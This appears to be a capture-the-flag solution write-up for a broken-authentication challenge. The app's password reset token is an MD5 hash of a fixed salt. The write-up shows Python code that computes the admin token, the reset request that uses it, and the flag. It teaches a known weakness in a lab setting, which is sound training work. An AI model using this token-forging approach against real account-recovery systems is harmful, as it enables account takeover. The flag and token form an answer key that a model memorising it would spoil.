**Solution: A13 - BROKEN AUTHENTICATION**

**Concept**  
Deterministic password reset token generation and account takeover.

**Walkthrough**  
1. Inspect the token generator in `challenge/app/app.py`.
2. Compute the admin reset hash:
   ```python
   import hashlib
   token = hashlib.md5(b"admin_secret_recovery_salt_2026").hexdigest()
   print(token) # 04519965d1d64380eb9a3dd732958f2d
   ```
3. Request `/reset?token=04519965d1d64380eb9a3dd732958f2d`.
4. The server returns the flag: `flag{predictable_reset_token}`.

**Flag**  
`flag{predictable_reset_token}`
